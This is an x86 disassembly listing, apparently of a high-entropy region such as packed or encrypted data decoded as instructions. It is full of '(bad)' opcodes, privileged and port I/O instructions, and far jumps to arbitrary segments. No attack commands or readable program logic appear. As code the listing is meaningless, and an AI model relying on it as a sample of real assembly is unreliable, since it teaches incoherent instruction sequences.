  40ba95:	sub    eax,0xc74eb715
  40ba9a:	jmp    0x21aa:0x860336ae
  40baa1:	sbb    al,0xb9
  40baa3:	je     0x40ba9c
  40baa5:	int    0x4c
  40baa7:	(bad)  
  40baa8:	bound  ecx,QWORD PTR [ecx-0x6aeff814]
  40baae:	inc    edi
  40baaf:	mov    esp,0xfcb6bdab
  40bab4:	jecxz  0x40ba56
  40bab6:	adc    al,0x3c
  40bab8:	leave  
  40bab9:	inc    ecx
  40baba:	ds mov ecx,0x8ece59f1
  40bac0:	inc    ecx
  40bac1:	mov    ?,WORD PTR [ecx+0x5e]
  40bac4:	sar    BYTE PTR [ebp-0x19],0xf4
  40bac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bac9:	mov    eax,ds:0x5e9859f4
  40bace:	leave  
  40bacf:	mov    edx,0x5f97ed20
  40bad4:	cwde   
  40bad5:	jne    0x40ba63
  40bad7:	cwde   
  40bad8:	sbb    al,0x18
  40bada:	and    DWORD PTR [edi],edx
  40badc:	jecxz  0x40bb33
  40bade:	and    ah,0x43
  40bae1:	sub    ch,BYTE PTR [edx-0x36e7117e]
  40bae7:	imul   esi,DWORD PTR [ecx+0x56],0x6
  40baeb:	test   al,0x74
  40baed:	mov    ds:0x2f8154ba,al
  40baf2:	sbb    DWORD PTR [esi+0x39],ecx
  40baf5:	imul   eax,DWORD PTR [eax-0x6b46a570],0xffffff87
  40bafc:	inc    eax
  40bafd:	fimul  DWORD PTR ds:0x28d873d4
  40bb03:	xchg   BYTE PTR [ebx-0x10c440f2],al
  40bb09:	gs push edi
  40bb0b:	(bad)  
  40bb0c:	stc    
  40bb0d:	(bad)  
  40bb0e:	clc    
  40bb0f:	adc    ecx,edx
  40bb11:	fwait
  40bb12:	repnz nop
  40bb14:	jg     0x40badd
  40bb16:	hlt    
  40bb17:	loopne 0x40bade
  40bb19:	stos   DWORD PTR es:[edi],eax
  40bb1a:	out    0x59,eax
  40bb1c:	sub    BYTE PTR [eax-0x50c280b8],0xd0
  40bb23:	push   edi
  40bb24:	dec    eax
  40bb25:	xlat   BYTE PTR ds:[ebx]
  40bb26:	lea    ebx,[ecx+0x14]
  40bb29:	and    al,0xf7
  40bb2b:	repz jecxz 0x40bb51
  40bb2e:	mov    eax,0x6eed4d49
  40bb33:	es fcomi st,st(2)
  40bb36:	in     eax,0xbe
  40bb38:	cmp    al,0x9
  40bb3a:	data16 adc al,0xc3
  40bb3d:	lods   eax,DWORD PTR ds:[esi]
  40bb3e:	inc    eax
  40bb3f:	pop    es
  40bb40:	ds clc 
  40bb42:	les    edi,FWORD PTR [ecx+eiz*2+0x1c346fa0]
  40bb49:	dec    edi
  40bb4a:	pop    ebp
  40bb4b:	xor    eax,0x530f77cb
  40bb50:	jge    0x40bb4e
  40bb52:	imul   edx,ebx,0x44
  40bb55:	and    DWORD PTR [edi-0x69],esp
  40bb58:	stos   BYTE PTR es:[edi],al
  40bb59:	popf   
  40bb5a:	xor    BYTE PTR [ebx+0x65],bl
  40bb5d:	sbb    BYTE PTR [esi-0x37],dh
  40bb60:	mov    bl,0x3d
  40bb62:	mov    cl,0xfc
  40bb64:	hlt    
  40bb65:	int3   
  40bb66:	push   DWORD PTR [ebx]
  40bb68:	loope  0x40baee
  40bb6a:	cdq    
  40bb6b:	imul   edi,edx,0xa1c6bdbc
  40bb71:	mov    ah,0x64
  40bb73:	lods   al,BYTE PTR ds:[si]
  40bb75:	add    ebx,eax
  40bb77:	ins    BYTE PTR es:[edi],dx
  40bb78:	mov    cs,WORD PTR [ecx+0x78]
  40bb7b:	jns    0x40bafe
  40bb7d:	popf   
  40bb7e:	adc    eax,0x9abe34f
  40bb83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb84:	jno    0x40bb7f
  40bb86:	jge    0x40bbb6
  40bb88:	add    al,0x11
  40bb8a:	imul   edx,eax,0xffffffef
  40bb8d:	stos   DWORD PTR es:[edi],eax
  40bb8e:	daa    
  40bb8f:	or     al,0xe4
  40bb91:	xchg   BYTE PTR ds:0xa7c5f026,ch
  40bb97:	scas   eax,DWORD PTR es:[edi]
  40bb98:	push   esp
  40bb99:	ltr    WORD PTR [edx+0x62]
  40bb9d:	jae    0x40bb7f
  40bb9f:	in     al,0x29
  40bba1:	ds scas al,BYTE PTR es:[edi]
  40bba3:	inc    ecx
  40bba4:	sub    eax,0xbae700cc
  40bba9:	dec    edi
  40bbaa:	xor    DWORD PTR [ebp-0x50eb045a],edi
  40bbb0:	out    0x29,eax
  40bbb2:	xor    edx,DWORD PTR [esi]
  40bbb4:	cdq    
  40bbb5:	jl     0x40bbc6
  40bbb7:	mov    esi,0xdf1b4629
  40bbbc:	cmp    eax,eax
  40bbbe:	test   DWORD PTR [edx-0x1bee728a],edi
  40bbc4:	cmp    ecx,DWORD PTR [ebx-0x164d5959]
  40bbca:	and    dh,BYTE PTR [ebp+0x47]
  40bbcd:	jno    0x40bc39
  40bbcf:	ficom  DWORD PTR [eax]
  40bbd1:	jne    0x40bc52
  40bbd3:	pusha  
  40bbd4:	test   eax,0x8916c6d9
  40bbd9:	fwait
  40bbda:	pop    ss
  40bbdb:	adc    BYTE PTR [esp+edx*2],dl
  40bbde:	adc    al,0xf8
  40bbe0:	ins    DWORD PTR es:[edi],dx
  40bbe1:	jo     0x40bc35
  40bbe3:	hlt    
  40bbe4:	mov    esi,0x17ffff00
  40bbe9:	in     eax,0x2
  40bbeb:	rcr    DWORD PTR [ecx+ebp*4-0x3c],cl
  40bbef:	inc    edi
  40bbf0:	adc    BYTE PTR [edx+esi*8-0x53],ah
  40bbf4:	mov    esi,0xafd8890e
  40bbf9:	dec    edi
  40bbfa:	inc    esp
  40bbfb:	or     al,0x80
  40bbfd:	jo     0x40bbb5
  40bbff:	mov    dh,0xce
  40bc01:	jno    0x40bc43
  40bc03:	lods   al,BYTE PTR ds:[esi]
  40bc04:	add    al,0x40
  40bc07:	out    dx,eax
  40bc08:	push   edx
  40bc09:	(bad)  
  40bc0a:	in     al,0x7f
  40bc0c:	aas    
  40bc0d:	push   esi
  40bc0e:	push   0x14
  40bc10:	or     al,0xfd
  40bc12:	sub    BYTE PTR [esi],cl
  40bc14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc15:	outs   dx,DWORD PTR ds:[esi]
  40bc16:	push   ebp
  40bc17:	jo     0x40bc4d
  40bc19:	clc    
  40bc1a:	push   ds
  40bc1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc1c:	loopne 0x40bc34
  40bc1e:	push   ds
  40bc1f:	retf   
  40bc20:	adc    edi,ebx
  40bc22:	mov    dh,0x18
  40bc24:	mov    dh,0xf6
  40bc26:	pop    esi
  40bc27:	gs jo  0x40bbdf
  40bc2a:	sbb    WORD PTR [ecx-0x3f0a36e8],bp
  40bc31:	mov    DWORD PTR [eax+0x117ccb4d],0xd43b9d83
  40bc3b:	lods   eax,DWORD PTR ss:[esi]
  40bc3d:	sbb    BYTE PTR [edx-0x5b],bh
  40bc40:	push   esi
  40bc41:	sbb    BYTE PTR [esi-0xc6dcc43],ch
  40bc47:	retf   
  40bc48:	rcl    edi,1
  40bc4a:	pusha  
  40bc4b:	out    dx,al
  40bc4c:	and    DWORD PTR [eax-0x6e4ab3bc],0x3f
  40bc53:	mov    ebx,0xef913d28
  40bc58:	dec    eax
  40bc59:	js     0x40bc62
  40bc5b:	push   ecx
  40bc5c:	fst    DWORD PTR [esi]
  40bc5e:	xor    DWORD PTR [ebp+0x79],esp
  40bc61:	sub    bl,bl
  40bc63:	sbb    DWORD PTR [edx+esi*2+0x38],0x2722fbe7
  40bc6b:	inc    ebx
  40bc6c:	dec    esp
  40bc6d:	gs push es
  40bc6f:	pop    ss
  40bc70:	(bad)  
  40bc71:	xlat   BYTE PTR ds:[ebx]
  40bc72:	xchg   ebp,eax
  40bc73:	inc    ebp
  40bc74:	jp     0x40bc73
  40bc76:	dec    edi
  40bc77:	xor    al,BYTE PTR [ecx+0x18]
  40bc7a:	jb     0x40bc1d
  40bc7c:	(bad)  
  40bc7d:	or     eax,0x50aed9c6
  40bc82:	push   es
  40bc83:	xor    edx,DWORD PTR [ecx+ebp*4-0x52]
  40bc87:	aad    0x5b
  40bc89:	int3   
  40bc8a:	cmp    ecx,ebx
  40bc8c:	cmp    ah,BYTE PTR [edi-0x500232dc]
  40bc92:	xlat   BYTE PTR ds:[ebx]
  40bc93:	mov    ebp,0xdf2501c5
  40bc98:	arpl   WORD PTR ds:0x3eb3e92,dx
  40bc9e:	jo     0x40bc68
  40bca0:	sub    dh,ch
  40bca2:	sub    eax,0x6fae8e7f
  40bca7:	push   edi
  40bca8:	sar    BYTE PTR [ebx+ebp*8],cl
  40bcab:	push   edi
  40bcac:	push   ebp
  40bcad:	jmp    0x8eeb:0x9106292e
  40bcb4:	pop    es
  40bcb5:	mov    al,0x61
  40bcb7:	ss mov edx,0x8dbf3f30
  40bcbd:	add    DWORD PTR [eax+0x17],ebx
  40bcc0:	out    0x20,al
  40bcc2:	and    BYTE PTR [eax-0x4e],0xd3
  40bcc6:	lahf   
  40bcc7:	cld    
  40bcc8:	test   BYTE PTR [ecx+0x7e],bh
  40bccb:	adc    DWORD PTR [edi-0x5059a31f],edi
  40bcd1:	pop    ebx
  40bcd2:	out    0xfa,eax
  40bcd4:	mov    edx,0xa29cdc19
  40bcd9:	bnd jl 0x40bcfe
  40bcdc:	or     bl,bh
  40bcde:	in     al,0x1b
  40bce0:	pop    ebp
  40bce1:	adc    al,0x1a
  40bce3:	sti    
  40bce4:	sub    BYTE PTR [edi],al
  40bce6:	(bad)  
  40bce8:	in     al,0xf2
  40bcea:	shl    ebx,cl
  40bcec:	and    al,0x61
  40bcee:	leave  
  40bcef:	sti    
  40bcf0:	stos   BYTE PTR es:[edi],al
  40bcf1:	push   ecx
  40bcf2:	push   es
  40bcf3:	adc    eax,0xf61e6469
  40bcf8:	jne    0x40bcdf
  40bcfa:	rcl    DWORD PTR [edi-0x36],cl
  40bcfd:	les    ebp,FWORD PTR [edi]
  40bcff:	shl    BYTE PTR [ecx],1
  40bd01:	out    0x84,al
  40bd03:	or     bl,BYTE PTR [ebp+0x69]
  40bd06:	pusha  
  40bd07:	inc    edx
  40bd08:	jge    0x40bcf7
  40bd0a:	arpl   WORD PTR [edi+0x1c],bp
  40bd0d:	repnz and DWORD PTR [edx+0x3cca58fa],eax
  40bd14:	popf   
  40bd15:	mov    ebp,0x65c9115d
  40bd1a:	xchg   esp,eax
  40bd1b:	sahf   
  40bd1c:	int3   
  40bd1d:	inc    ebx
  40bd1e:	push   0xffffffcf
  40bd20:	nop
  40bd21:	mov    ds:0xb5542ae1,al
  40bd26:	mov    esi,eax
  40bd28:	inc    eax
  40bd29:	jp     0x40bd56
  40bd2b:	mov    al,0x2f
  40bd2d:	mov    WORD PTR [edi-0x5b],cs
  40bd30:	lahf   
  40bd31:	cmp    cl,BYTE PTR [edx+0x56]
  40bd34:	cmp    cl,BYTE PTR [ebp+0x54]
  40bd37:	fstp   TBYTE PTR [esp+ebx*1-0x3]
  40bd3b:	imul   edi,esi,0x4450f44c
  40bd41:	mov    esp,0xe71c2e10
  40bd46:	dec    ebp
  40bd47:	mov    bl,0x6
  40bd49:	lahf   
  40bd4a:	xchg   DWORD PTR [ebp+edx*8-0x13],eax
  40bd4e:	or     DWORD PTR [eax+0xd79e2ce],ebp
  40bd54:	xchg   BYTE PTR [ebp+0x5f],ah
  40bd57:	xchg   ebx,eax
  40bd58:	xchg   edx,eax
  40bd59:	push   edx
  40bd5a:	popa   
  40bd5b:	add    ebx,0x68
  40bd5e:	nop
  40bd5f:	dec    ch
  40bd61:	jae    0x40bd1d
  40bd63:	rcr    BYTE PTR [edi],1
  40bd65:	imul   esi,edi,0x5c8b3a31
  40bd6b:	dec    esp
  40bd6c:	(bad)  
  40bd6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd6e:	dec    esp
  40bd6f:	jg     0x40bdd9
  40bd71:	loopne 0x40bd25
  40bd73:	repz adc DWORD PTR [edx],ebp
  40bd76:	adc    al,0xeb
  40bd78:	pusha  
  40bd79:	(bad)  
  40bd7a:	std    
  40bd7b:	xchg   ecx,eax
  40bd7c:	dec    BYTE PTR [ebp-0x44]
  40bd7f:	jmp    0x40bdd1
  40bd81:	jnp    0x40bd5c
  40bd83:	jmp    0xf89d:0xa0d0c4fa
  40bd8a:	dec    ebp
  40bd8b:	xchg   esi,eax
  40bd8c:	and    al,0x30
  40bd8e:	xor    BYTE PTR [edi-0x28aa25ae],0xba
  40bd95:	enter  0xf55f,0xbc
  40bd99:	sub    BYTE PTR [ecx],dh
  40bd9b:	test   al,0xb3
  40bd9d:	(bad)  
  40bd9e:	pushf  
  40bd9f:	adc    al,0x4c
  40bda1:	pop    ss
  40bda2:	pop    esp
  40bda3:	push   esi
  40bda4:	push   ecx
  40bda5:	mov    eax,0xab233cd8
  40bdaa:	fdiv   QWORD PTR [ebx]
  40bdac:	dec    ebx
  40bdad:	call   0x4c3defc0
  40bdb2:	aam    0xe9
  40bdb4:	or     BYTE PTR [edx-0x6ec48f54],bl
  40bdba:	lea    ebx,[ecx]
  40bdbc:	das    
  40bdbd:	inc    ecx
  40bdbe:	(bad)  
  40bdbf:	and    eax,0xa3ffdac8
  40bdc4:	sbb    BYTE PTR [ebx+esi*1+0x12],cl
  40bdc8:	push   0xffffffa7
  40bdca:	out    0x8e,al
  40bdcc:	cmp    DWORD PTR [eax+0x4e],ebx
  40bdcf:	leave  
  40bdd0:	inc    eax
  40bdd1:	or     cl,BYTE PTR [ecx-0x78]
  40bdd4:	leave  
  40bdd5:	shl    ecx,0x23
  40bdd8:	scas   eax,DWORD PTR es:[edi]
  40bdd9:	or     ebp,DWORD PTR [ecx+0x42]
  40bddc:	out    dx,al
  40bddd:	xor    DWORD PTR [esi+0x3bbb9859],ebp
  40bde3:	mov    bl,BYTE PTR [esi]
  40bde5:	lds    esp,FWORD PTR [ecx-0x3d]
  40bde8:	or     DWORD PTR [ebx-0x774ff1fa],ecx
  40bdee:	fisub  WORD PTR [edx-0x5c]
  40bdf1:	out    0x67,al
  40bdf3:	mov    dl,0x7
  40bdf5:	mov    bl,BYTE PTR [eax-0x608a6242]
  40bdfb:	neg    edx
  40bdfd:	adc    al,0xbe
  40bdff:	scas   eax,DWORD PTR es:[edi]
  40be00:	loope  0x40be7f
  40be02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be03:	cwde   
  40be04:	test   eax,0x29599512
  40be09:	push   edx
  40be0a:	sub    ebx,ebx
  40be0c:	mov    ds:0x98e670de,al
  40be11:	leave  
  40be12:	inc    esi
  40be13:	add    al,0xf0
  40be15:	in     eax,0x6a
  40be17:	mov    ds:0xcac3395,eax
  40be1c:	inc    edx
  40be1d:	and    dh,BYTE PTR [edx]
  40be1f:	cld    
  40be20:	and    al,0xbc
  40be22:	imul   esp,DWORD PTR [ecx],0x9f5a98d1
  40be28:	jecxz  0x40bea3
  40be2a:	adc    DWORD PTR [ebx],ebp
  40be2c:	popa   
  40be2d:	out    dx,eax
  40be2e:	sahf   
  40be2f:	sub    edx,DWORD PTR [eax+edx*2]
  40be32:	jno    0x40bdf0
  40be34:	dec    edx
  40be35:	repz xor ebx,ebp
  40be38:	xlat   BYTE PTR ds:[ebx]
  40be39:	mov    ds:0xc2ffe55a,al
  40be3e:	push   0xffffffac
  40be40:	int    0x49
  40be42:	sbb    DWORD PTR [ecx],eax
  40be44:	in     eax,dx
  40be45:	or     bl,ah
  40be47:	call   FWORD PTR [esi-0x4b8368e]
  40be4d:	gs imul ebx,edx,0xefbca50a
  40be54:	jge    0x40bdf5
  40be56:	push   ebp
  40be57:	aas    
  40be58:	dec    esi
  40be59:	mov    WORD PTR [ecx+0x32608386],ds
  40be5f:	pop    eax
  40be60:	sbb    cl,dh
  40be62:	xchg   ecx,eax
  40be63:	add    ebp,edx
  40be65:	pushf  
  40be66:	jae    0x40be02
  40be68:	inc    esp
  40be69:	mov    eax,0xdc33bb78
  40be6e:	mov    BYTE PTR [edi+0x6b],al
  40be71:	xor    BYTE PTR [ebp+0x57c6d23f],dl
  40be77:	cmp    ah,BYTE PTR [edx]
  40be79:	sub    al,0x13
  40be7b:	loop   0x40be65
  40be7d:	pop    ds
  40be7e:	mov    ebp,DWORD PTR [ebx+0x12]
  40be81:	mov    DWORD PTR [ecx+0x771e91c8],esi
  40be87:	sub    esi,ebp
  40be89:	stos   BYTE PTR es:[di],al
  40be8b:	jb     0x40be2d
  40be8d:	and    ebp,ebx
  40be8f:	or     dh,BYTE PTR [ebx-0x1f]
  40be92:	ret    
  40be93:	pushf  
  40be94:	dec    ecx
  40be95:	sub    DWORD PTR cs:0xbadb44e7,0xffffff80
  40be9d:	cmp    eax,0x19aa2530
  40bea2:	and    al,0x5b
  40bea4:	jmp    0xfcf40ed3
  40bea9:	add    al,0x11
  40beab:	push   edi
  40beac:	cmp    dh,BYTE PTR ds:0x8ebf37cb
  40beb2:	mov    ds:0x8d4d2c8f,al
  40beb7:	scas   al,BYTE PTR es:[edi]
  40beb8:	js     0x40be8a
  40beba:	fwait
  40bebb:	push   cs
  40bebc:	jp     0x40bef1
  40bebe:	imul   ebx,ebp,0x814c4d1b
  40bec4:	add    BYTE PTR cs:[edx+0x39],0x45
  40bec9:	pusha  
  40beca:	push   ds
  40becb:	test   esi,esp
  40becd:	adc    ebx,esp
  40becf:	pop    ecx
  40bed0:	push   0x3e
  40bed2:	fcom   QWORD PTR [edi]
  40bed4:	(bad)  
  40bed5:	cmp    eax,0xc50062e7
  40beda:	and    ebx,DWORD PTR [edi]
  40bedc:	sbb    al,0x8c
  40bede:	fwait
  40bedf:	test   al,0x1a
  40bee1:	call   esi
  40bee3:	jb     0x40bf18
  40bee5:	out    0xa8,al
  40bee7:	inc    edi
  40bee8:	add    BYTE PTR [ebx],ah
  40beea:	mov    dl,0xc3
  40beec:	or     al,0x8c
  40beee:	call   0x810fa086
  40bef3:	or     BYTE PTR [edi],dh
  40bef5:	dec    ecx
  40bef6:	xchg   ecx,eax
  40bef7:	jne    0x40bf48
  40bef9:	fisubr DWORD PTR [esi+0x49]
  40befc:	dec    esi
  40befd:	sub    ebp,eax
  40beff:	ja     0x40beba
  40bf01:	dec    ebx
  40bf02:	test   DWORD PTR [esi-0x5],0xac0f68a5
  40bf09:	inc    edi
  40bf0a:	xchg   ebp,eax
  40bf0b:	dec    ebx
  40bf0c:	cld    
  40bf0d:	pop    edi
  40bf0e:	fdivp  st(7),st
  40bf10:	xchg   BYTE PTR [esi],bl
  40bf12:	outs   dx,BYTE PTR ds:[esi]
  40bf13:	ins    BYTE PTR es:[edi],dx
  40bf14:	ins    DWORD PTR es:[edi],dx
  40bf15:	xlat   BYTE PTR ds:[ebx]
  40bf16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf17:	dec    edx
  40bf18:	cmp    eax,0xeb4c37c7
  40bf1d:	dec    ecx
  40bf1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf1f:	mov    ds:0x9905f3b1,al
  40bf24:	inc    edi
  40bf25:	bound  ecx,QWORD PTR [edx+eax*2-0x63]
  40bf29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf2a:	dec    eax
  40bf2b:	jno    0x40bfa2
  40bf2d:	ins    DWORD PTR es:[edi],dx
  40bf2e:	pop    edx
  40bf2f:	adc    edx,DWORD PTR [edi+esi*4]
  40bf32:	adc    eax,0xeb643694
  40bf37:	(bad)  
  40bf38:	or     al,0xe7
  40bf3a:	iret   
  40bf3b:	(bad)  
  40bf3c:	xor    al,0xc8
  40bf3e:	in     eax,dx
  40bf3f:	rol    DWORD PTR [ecx-0x5a],cl
  40bf42:	(bad)  
  40bf43:	out    dx,eax
  40bf44:	inc    ebx
  40bf45:	mov    gs,WORD PTR [edi+0x2a0b07b1]
  40bf4b:	jl     0x40bfaf
  40bf4d:	retf   0xe99b
  40bf50:	add    ch,dh
  40bf52:	in     eax,0xc5
  40bf54:	or     al,0x1c
  40bf56:	push   0x9384e981
  40bf5b:	cs inc ebx
  40bf5d:	fcomp  DWORD PTR [esi-0x22]
  40bf60:	jg     0x40bf01
  40bf62:	mov    edx,0x4e2efe4d
  40bf67:	and    eax,0x5f86d9e7
  40bf6c:	clc    
  40bf6d:	dec    ebx
  40bf6e:	sub    BYTE PTR [ebx],0xc2
  40bf71:	xchg   esi,eax
  40bf72:	scas   eax,DWORD PTR es:[edi]
  40bf73:	adc    al,0x1a
  40bf75:	push   0x860dd989
  40bf7a:	in     al,dx
  40bf7b:	ja     0x40bf0f
  40bf7d:	addr16 or ch,0xfd
  40bf81:	cmp    eax,0x2f308335
  40bf86:	dec    ebp
  40bf87:	fist   DWORD PTR [eax+0x1d]
  40bf8a:	sub    DWORD PTR [edx+edx*8],esi
  40bf8d:	xchg   esp,eax
  40bf8e:	add    al,0x0
  40bf90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf91:	int    0x54
  40bf93:	add    al,BYTE PTR [ecx]
  40bf95:	adc    BYTE PTR [edx-0x4f],ch
  40bf98:	push   ebp
  40bf99:	mov    edi,0x3513388c
  40bf9e:	loop   0x40bf3c
  40bfa0:	mov    BYTE PTR [ebp+0x42],0xe5
  40bfa4:	add    BYTE PTR [esi],ch
  40bfa6:	hlt    
  40bfa7:	adc    bh,bl
  40bfa9:	jae    0x40bff9
  40bfab:	aam    0x45
  40bfad:	repnz inc eax
  40bfaf:	mov    esp,eax
  40bfb1:	in     al,dx
  40bfb2:	and    esp,eax
  40bfb4:	push   eax
  40bfb5:	dec    esi
  40bfb6:	pop    edi
  40bfb7:	enter  0xcc27,0xdb
  40bfbb:	mov    ebp,0x22ab9ce3
  40bfc0:	retf   
  40bfc1:	mov    ds:0xe8fb4bbc,al
  40bfc6:	sbb    edi,ecx
  40bfc8:	aam    0xfd
  40bfca:	loop   0x40c03c
  40bfcc:	iret   
  40bfcd:	pop    ecx
  40bfce:	jecxz  0x40c04d
  40bfd0:	(bad)  
  40bfd1:	mov    cl,0x25
  40bfd3:	add    ebx,DWORD PTR [edx+0x2a7f2dde]
  40bfd9:	fs jns 0x40bf6d
  40bfdc:	push   esi
  40bfdd:	iret   
  40bfde:	push   ds
  40bfdf:	iret   
  40bfe0:	inc    edx
  40bfe1:	mov    eax,ds:0x276c2d8
  40bfe6:	out    0x17,al
  40bfe8:	pop    edx
  40bfe9:	jg     0x40c03c
  40bfeb:	sti    
  40bfec:	std    
  40bfed:	add    dl,BYTE PTR [ebp-0x55f2dc92]
  40bff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bff4:	sbb    bh,0x80
  40bff7:	xor    DWORD PTR [edx-0x50],esi
  40bffa:	or     al,0xd9
  40bffc:	xchg   bh,cl
  40bffe:	xchg   edi,eax
  40bfff:	ds enter 0xc2c,0x3b
  40c004:	sbb    al,0x45
  40c006:	inc    esp
  40c007:	in     al,dx
  40c008:	mov    edx,0x2ed89d27
  40c00d:	cmp    bh,BYTE PTR [eax+0x5501c71e]
  40c013:	lahf   
  40c014:	adc    ecx,DWORD PTR [ebx+0x4665d38b]
  40c01a:	test   DWORD PTR [ebp-0x42167a5e],esp
  40c020:	jns    0x40c04d
  40c022:	hlt    
  40c023:	nop
  40c024:	lds    ebp,FWORD PTR [edx+0x7a5f1216]
  40c02a:	mov    al,0xa3
  40c02c:	adc    BYTE PTR ds:0x70af6100,bl
  40c032:	retf   0xcf05
  40c035:	mov    bl,0xe1
  40c037:	lahf   
  40c038:	and    DWORD PTR [edi],0xd22935ee
  40c03e:	fld    QWORD PTR [edx]
  40c040:	jbe    0x40c008
  40c042:	xchg   esi,eax
  40c043:	outs   dx,BYTE PTR ds:[esi]
  40c044:	mov    dh,0xe4
  40c046:	fiadd  DWORD PTR [ebx]
  40c048:	adc    edx,DWORD PTR [eax]
  40c04a:	or     al,0xce
  40c04c:	or     ebx,DWORD PTR [edx+edi*2]
  40c04f:	mov    al,ds:0x27e7f241
  40c054:	xchg   ebp,eax
  40c055:	sbb    eax,0xf88ab4c5
  40c05a:	dec    eax
  40c05b:	and    BYTE PTR [edx+ecx*8-0x13],ah
  40c05f:	loopne 0x40c0ca
  40c061:	lock push es
  40c063:	xor    eax,0xb2a0adef
  40c068:	cmp    dl,BYTE PTR [ebp+0x23]
  40c06b:	es loop 0x40c092
  40c06e:	and    eax,DWORD PTR [ecx]
  40c070:	jo     0x40c01f
  40c072:	cmp    WORD PTR [eax+edi*8-0x4d],di
  40c077:	jp     0x40c0f0
  40c079:	and    dh,BYTE PTR [ecx+0x67e49bfc]
  40c07f:	xor    al,0x57
  40c081:	sub    al,0xfd
  40c083:	(bad)  
  40c084:	fmul   QWORD PTR [ebx]
  40c086:	dec    ebp
  40c087:	jb     0x40c018
  40c089:	xor    dl,ah
  40c08b:	cli    
  40c08c:	add    edi,DWORD PTR [ebx+eax*8-0x382139e3]
  40c093:	mov    esp,0x15ae3ecb
  40c098:	pop    ecx
  40c099:	fld    DWORD PTR [edi+0xe]
  40c09c:	ss mov al,0x9
  40c09f:	adc    edx,DWORD PTR [eax]
  40c0a1:	or     eax,0xd1fdc254
  40c0a6:	xchg   edi,eax
  40c0a7:	sub    eax,ebp
  40c0a9:	inc    edi
  40c0aa:	in     eax,dx
  40c0ab:	test   DWORD PTR [edi],ebp
  40c0ad:	xchg   DWORD PTR [edi+0x4],ebp
  40c0b0:	fsub   st,st(2)
  40c0b2:	cmp    bh,bh
  40c0b4:	aad    0x38
  40c0b6:	fsubr  QWORD PTR [edx+0x7e]
  40c0b9:	stos   DWORD PTR es:[edi],eax
  40c0ba:	shl    BYTE PTR [ebx],1
  40c0bc:	bound  esi,QWORD PTR [esi+eax*8+0x40]
  40c0c0:	push   ebx
  40c0c1:	cmp    bh,dl
  40c0c3:	js     0x40c050
  40c0c5:	push   esi
  40c0c6:	(bad)  
  40c0c7:	scas   al,BYTE PTR es:[edi]
  40c0c8:	fnsave [edx+0x7a]
  40c0cb:	jo     0x40c0fb
  40c0cd:	repz sahf 
  40c0cf:	clc    
  40c0d0:	lahf   
  40c0d1:	stos   DWORD PTR es:[edi],eax
  40c0d2:	daa    
  40c0d3:	mov    ebx,0x6615f30c
  40c0d8:	xor    eax,DWORD PTR [edx-0x63]
  40c0db:	jae    0x40c077
  40c0dd:	xlat   BYTE PTR ds:[ebx]
  40c0de:	ret    0x6085
  40c0e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0e2:	lds    eax,FWORD PTR [eax]
  40c0e4:	aaa    
  40c0e5:	adc    BYTE PTR [ebx+0x62],al
  40c0e8:	test   ah,cl
  40c0ea:	jbe    0x40c167
  40c0ec:	mov    edx,0xb420572f
  40c0f1:	fisttp QWORD PTR [esi-0x2b]
  40c0f4:	mov    esp,DWORD PTR [eax]
  40c0f6:	fs pop ebp
  40c0f8:	add    edx,DWORD PTR ds:[esi+0x66]
  40c0fc:	in     al,0xb2
  40c0fe:	fidiv  DWORD PTR [ebx+0x21]
  40c101:	adc    bh,BYTE PTR [ecx+0x18]
  40c104:	push   ebx
  40c105:	pop    edi
  40c106:	adc    edi,edx
  40c108:	ds jmp 0x58d3:0x2d578a56
  40c110:	les    ecx,FWORD PTR [eax-0x67]
  40c113:	jp     0x40c0cb
  40c115:	mov    esi,0x62e14557
  40c11a:	test   eax,0xbd6a284e
  40c11f:	test   al,0x53
  40c121:	fild   WORD PTR [edx-0x1c9f9211]
  40c127:	jmp    0x6dab090
  40c12c:	cmp    BYTE PTR [eax+0x6d8c10cf],bh
  40c132:	outs   dx,BYTE PTR ds:[esi]
  40c133:	js     0x40c0f2
  40c135:	jge    0x40c1a8
  40c137:	das    
  40c138:	outs   dx,DWORD PTR ds:[esi]
  40c139:	jmp    0xdac3:0xf2d67ea4
  40c140:	lods   al,BYTE PTR ds:[esi]
  40c141:	jb     0x40c195
  40c143:	icebp  
  40c144:	lea    ebx,[eax-0x60bf4ddc]
  40c14a:	adc    al,0x50
  40c14c:	jp     0x40c13e
  40c14e:	mov    eax,0xc7197a42
  40c153:	and    eax,0x8931fbe4
  40c158:	inc    esp
  40c159:	repz mov eax,ds:0x8cab2a99
  40c15f:	fisttp DWORD PTR fs:[esp+edi*4+0x1b]
  40c164:	scas   al,BYTE PTR es:[edi]
  40c165:	scas   al,BYTE PTR es:[edi]
  40c166:	xchg   esi,eax
  40c167:	(bad)  
  40c168:	jmp    0xe42f2aa7
  40c16d:	dec    ebx
  40c16e:	cmp    bh,al
  40c170:	add    eax,0x8ed24a79
  40c175:	pop    ebx
  40c176:	aas    
  40c177:	in     al,dx
  40c178:	cmp    DWORD PTR cs:[edi+0x246e309c],eax
  40c17f:	xadd   DWORD PTR es:[ebx+ebx*8-0x450e44ab],edx
  40c188:	out    0x2a,al
  40c18a:	mov    ebx,0x6caceb76
  40c18f:	add    DWORD PTR gs:[esi-0x10],esp
  40c193:	xchg   esp,eax
  40c194:	jnp    0x40c14e
  40c196:	sbb    al,0xef
  40c198:	(bad)
  40c19c:	inc    edx
  40c19d:	mov    dl,0xdc
  40c19f:	pop    edi
  40c1a0:	mov    BYTE PTR [ebx+0x2860df64],dl
  40c1a6:	cmp    edx,eax
  40c1a8:	pop    ss
  40c1a9:	in     al,0xcb
  40c1ab:	aad    0xac
  40c1ad:	fisttp QWORD PTR [ebx]
  40c1af:	(bad)  
  40c1b0:	push   ecx
  40c1b1:	mul    ch
  40c1b3:	pop    eax
  40c1b4:	cli    
  40c1b5:	cs jle 0x40c13c
  40c1b8:	xor    al,0xb4
